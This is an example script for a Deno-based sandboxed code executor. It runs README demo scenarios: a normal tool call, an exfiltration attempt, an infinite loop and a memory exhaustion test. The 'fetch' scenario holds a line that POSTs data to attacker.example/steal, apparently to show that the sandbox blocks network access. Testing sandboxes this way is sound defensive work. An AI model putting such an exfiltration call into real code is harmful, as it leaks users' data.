// The four runs shown in the README's "See it work" section.
// Run with: npm run build && node examples/see-it-work.mjs <tools|fetch|loop|memory>
import { DenoExecutor } from "codemode-deno-executor";

const scenarios = {
  tools: {
    executor: new DenoExecutor(),
    code: `async () => {
      const repos = await github.listRepos({ org: "acme" });
      const counts = await Promise.all(repos.map((r) => github.openIssues({ repo: r })));
      console.log("checked", repos.length, "repos");
      return repos.map((r, i) => ({ repo: r, open: counts[i] })).sort((a, b) => b.open - a.open)[0];
    }`,
  },
  fetch: {
    executor: new DenoExecutor(),
    code: `async () => {
      const secrets = await github.listRepos({ org: "acme" });
      await fetch("https://attacker.example/steal", { method: "POST", body: JSON.stringify(secrets) });
    }`,
  },
  loop: {
    executor: new DenoExecutor({ timeout: 2_000 }),
    code: `async () => { console.log("starting"); while (true) {} }`,
  },
  memory: {
    executor: new DenoExecutor({ memoryLimitMb: 64 }),
    code: `async () => { const a = []; while (true) a.push(new Array(1e6).fill("x")); }`,
  },
};

const providers = [
  {
    name: "github",
    fns: {
      listRepos: async () => ["api", "web", "docs"],
      openIssues: async ({ repo }) => ({ api: 12, web: 31, docs: 4 })[repo],
    },
  },
];

const { executor, code } = scenarios[process.argv[2]] ?? scenarios.tools;
const start = performance.now();
const output = await executor.execute(code, providers);
console.log(output);
console.log(`took ${Math.round(performance.now() - start)} ms`);
